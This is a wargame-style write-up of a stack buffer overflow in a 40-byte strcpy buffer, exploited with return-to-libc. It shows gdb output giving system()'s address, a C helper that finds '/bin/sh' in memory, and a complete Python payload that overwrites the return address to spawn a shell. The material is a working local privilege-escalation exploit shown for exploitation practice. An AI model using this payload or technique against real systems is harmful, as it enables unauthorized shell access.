# Vulnerability
```c
char buffer[40];
strcpy(buffer, argv[1]);
```
This program uses strcpy function that does not check boundary.

I will overwrite SFP & RET address but there is a protection code:
```c
if(argv[1][47] == '\xbf')
	{
		printf("stack betrayed you!!\n");
		exit(0);
	}
```

# Exploitation
The problem's hint is RTL(Return To Library).

I will use Library Function in RET address such as system(), execve(), etc ..

The parameter will be:
```
--------------------------------------------------------------------------
| buffer | SFP | RET(system) | AAAA(system's ret) | ????(system's param) |
--------------------------------------------------------------------------
```
I got system's address in gdb:

```
(gdb) p system
$1 = {<text variable, no debug info>} 0x40058ae0 <__libc_system>
(gdb) 
```

I will pass system's param as "/bin/sh"'s address.

To find "/bin/sh"'s address, I made a simple C code:
```c
#include <stdio.h>
int main(void) {
	long shell=0x40058ae0;
	while(memcmp((void*)shell, "/bin/sh", 8)) {
		shell++;
	}
	printf("Address of /bin/sh: 0x%x\n", shell);
}
```
This program finds "/bin/sh"'s address based on system's address.

The "/bin/sh"'s address is:
```
[darkknight@localhost darkknight]$ gcc -o ./getsh ./getsh.c 
[darkknight@localhost darkknight]$ 
[darkknight@localhost darkknight]$ ./getsh 
Address of /bin/sh: 0x400fbff9
```

# Payload
```python
import os

payload = ""
payload = payload + "A"*40
payload = payload + "B"*4 #SFP
payload = payload + "\xe0\x8a\x05\x40" # system's address
payload = payload + "A"*4 # system's ret
payload = payload + "\xf9\xbf\x0f\x40" # /bin/sh's address

os.execv("/home/darkknight/bugbear", ["", payload])
```
